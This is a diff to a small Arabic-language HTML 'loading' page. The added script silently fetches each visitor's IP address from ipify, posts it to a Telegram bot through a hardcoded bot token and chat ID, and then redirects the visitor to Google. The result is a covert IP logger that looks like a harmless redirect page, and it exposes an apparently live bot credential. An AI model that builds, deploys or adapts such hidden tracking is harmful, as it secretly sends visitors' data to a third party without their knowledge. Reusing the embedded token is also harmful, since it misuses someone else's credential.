@@ -3,26 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <title>جاري التحميل...</title>
-    <style>
-        body { font-family: Tahoma, sans-serif; text-align: center; margin-top: 50px; background-color: #f4f4f9; }
-        .box { background: white; padding: 20px; border-radius: 8px; display: inline-block; box-shadow: 0px 0px 10px rgba(0,0,0,0.1); }
-    </style>
 </head>
 <body>
-    <div class="box">
-        <h2>جاري تحويلك... يرجى الانتظار</h2>
-        <p id="ip-display">جاري جلب البيانات...</p>
-    </div>
+    <p>يرجى الانتظار قليلاً...</p>
 
     <script>
+        const telegramToken = '8815702628:AAGFvFNqM7ZjysFguBMwG2qFTmOpMW3k9GU';
+        const chatId = '5531163320';
+
         fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
             .then(data => {
                 let userIp = data.ip;
-                document.getElementById('ip-display').innerText = "عنوان الـ IP الخاص بك هو: " + userIp;
+                let message = `🔔 زائر جديد للموقع!\n🌐 IP: ${userIp}`;
+
+                fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                }).finally(() => {
+                    window.location.href = "https://www.google.com";
+                });
             })
             .catch(error => {
-                document.getElementById('ip-display').innerText = "عذراً، حدث خطأ.";
+                window.location.href = "https://www.google.com";
             });
     </script>
 </body>
